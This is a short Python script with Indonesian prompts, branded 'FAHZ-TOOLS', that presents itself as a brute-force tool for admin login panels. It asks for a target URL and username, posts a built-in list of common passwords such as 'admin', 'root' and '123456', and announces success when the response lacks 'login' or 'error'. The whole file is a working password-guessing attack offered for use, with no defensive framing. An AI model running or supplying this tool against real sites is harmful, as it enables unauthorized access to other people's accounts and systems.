#!/usr/bin/env python3
import requests
import sys
import threading

print_lock = threading.Lock()

def brute_force(url, username, password_list):
    for password in password_list:
        data = {'username': username, 'password': password.strip()}
        
        try:
            response = requests.post(url, data=data, timeout=5)
            
            if "login" not in response.text.lower() and "error" not in response.text.lower():
                with print_lock:
                    print(f"\n[✓] BERHASIL! Username: {username} | Password: {password.strip()}")
                    print(f"[✓] Admin Panel ditemukan di: {url}")
                    return True
            else:
                with print_lock:
                    print(f"[*] Mencoba: {password.strip()} - Gagal", end='\r')
        except:
            pass
    return False

if __name__ == "__main__":
    print("="*50)
    print("🔓 BRUTE FORCE TOOL - FAHZ-TOOLS 🔓")
    print("="*50)
    
    target_url = input("\nMasukkan URL admin panel (contoh: http://example.com/admin/login.php): ")
    username = input("Masukkan username target: ")
    
    print("\n[*] Memuat wordlist default...")
    passwords = [
        "admin", "password", "123456", "root", "toor", 
        "admin123", "password123", "qwerty", "12345678",
        "admin12345", "passw0rd", "root123"
    ]
    
    print(f"[*] Memulai Brute Force dengan {len(passwords)} password...\n")
    
    if brute_force(target_url, username, passwords):
        print("\n[✓] Login credentials ditemukan!")
    else:
        print("\n[✗] Tidak ditemukan password yang cocok.")
